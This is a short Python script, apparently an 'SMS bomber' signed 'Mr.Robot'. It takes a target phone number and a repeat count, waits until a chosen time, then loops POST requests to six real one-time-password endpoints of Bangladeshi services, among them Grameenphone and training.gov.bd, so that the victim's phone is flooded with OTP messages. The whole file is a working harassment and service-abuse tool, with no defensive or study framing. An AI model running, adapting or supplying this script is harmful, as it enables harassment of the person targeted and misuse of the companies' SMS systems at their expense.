import requests
import time

api1 = "https://weblogin.grameenphone.com/backend/api/v1/otp"
api2 = "https://training.gov.bd/backoffice/api/user/sendOtp"
api3 = "https://api.osudpotro.com/api/v1/users/send_otp"
api4 = "https://api.apex4u.com/api/auth/login"
api6 = "https://ap.paymasterbd.net/login_registration/"

def send_sms(phone_number, amount):
    data1 = {"msisdn": phone_number}
    data2 = {"mobile": phone_number}
    data3 = {"mobile": phone_number, "deviceToken": "web", "language": "en", "os": "web"}
    data4 = {"phoneNumber": phone_number}
    data6 = {"msisdn": phone_number}
    api5 = f"https://agromukam.com/Customer/SendOtpCode?phoneNumber={phone_number}"

    for _ in range(amount):
        try:
            response1 = requests.post(api1, json=data1)
            response2 = requests.post(api2, json=data2)
            response3 = requests.post(api3, json=data3)
            response4 = requests.post(api4, json=data4)
            response5 = requests.post(api5)
            response6 = requests.post(api6, json=data6)

            print("SMS SENT BY Mr.Robot")
            print("Response 1:", response1.json())
            print("Response 2:", response2.json())
            print("Response 3:", response3.json())
            print("Response 4:", response4.json())
            print("Response 5:", response5.json())
            print("Response 6:", response6.json())
        except Exception as e:
            print("An error occurred:", e)

def schedule_sms():
    phone_number = input("Enter your phone number: ")
    amount = int(input("Enter your amount: "))  # Convert amount to integer
    send_time = input("Enter the time to send the message (HH:MM): ")

    # Convert send_time to seconds from now
    current_time = time.localtime()
    target_time = time.strptime(send_time, "%H:%M")
    target_seconds = (target_time.tm_hour - current_time.tm_hour) * 3600 + (target_time.tm_min - current_time.tm_min) * 60

    if target_seconds < 0:
        target_seconds += 86400  # Add a day if the time is in the past

    print(f"Waiting for {target_seconds} seconds to send SMS...")
    time.sleep(target_seconds)
    send_sms(phone_number, amount)

print("Program is running...")
schedule_sms()